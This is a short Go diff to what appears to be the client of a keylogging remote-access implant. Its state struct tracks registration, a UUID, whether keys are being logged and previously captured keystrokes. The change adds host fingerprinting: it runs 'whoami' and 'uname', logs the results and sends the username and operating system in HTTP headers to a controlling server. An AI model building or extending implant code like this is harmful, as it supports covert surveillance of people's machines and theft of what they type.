@@ -30,6 +30,7 @@ type ClientState struct {
 	IsRegistered  bool
 	UUID          string
 	Username      string
+	OS            string
 	IsLoggingKeys bool
 	PreviousKeys  string
 }
@@ -91,8 +92,18 @@ func setHeaders(r http.Request) {
 	if state.Username == "" {
 		logger.Debug("Getting username")
 		state.Username = strings.TrimSpace(ExecuteCommand([]string{"whoami"}))
+		logger.Debug("Host username is: " + state.Username)
+	}
+	if state.OS == "" {
+		logger.Debug("Getting operating system")
+		state.OS = strings.TrimSpace(ExecuteCommand([]string{"uname"}))
+		if state.OS != "Linux" {
+			state.OS = "Windows"
+		}
+		logger.Debug("Host operating system is: " + state.OS)
 	}
 	r.Header.Set("Username", state.Username)
+	r.Header.Set("OS", state.OS)
 	r.Header.Set("UUID", state.UUID)
 }
 
